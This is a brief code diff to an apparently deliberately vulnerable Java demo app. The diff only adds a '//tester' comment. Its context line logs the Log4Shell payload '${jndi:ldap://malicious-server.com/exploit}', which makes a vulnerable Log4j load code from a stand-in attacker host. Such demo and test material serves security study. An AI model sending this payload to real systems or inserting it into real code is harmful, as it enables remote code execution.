@@ -37,6 +37,8 @@ public class Main {
         System.out.println("Hello, running vulnerable app...");
 
         // Log4j vulnerability (Log4Shell exploit attempt)
+         //tester
+         
         logger.error("${jndi:ldap://malicious-server.com/exploit}");
 
         try {
